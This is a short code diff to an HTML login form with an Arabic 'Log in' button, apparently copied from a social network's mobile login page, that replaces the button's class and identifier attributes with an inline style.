@@ -805,12 +805,10 @@
                           data-sigil="login_password_step_element"
                         >
                           <button
+                            style="font-size: 17px;height: 40px;border: none;border-radius: 3px;line-height: 40px;text-shadow: 0 -1px rgb(0 0 0 / 25%);display: block;width: 100%;color: #fff;vertical-align: top;white-space: nowrap;font-weight: bold;"
                             type="button"
                             value="تسجيل الدخول"
-                            class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
-                            name="login"
-                            data-sigil="touchable login_button_block m_login_button"
-                            data-autoid="autoid_4"
+
                           >
                             <span class="_55sr">تسجيل الدخول</span>
                           </button>
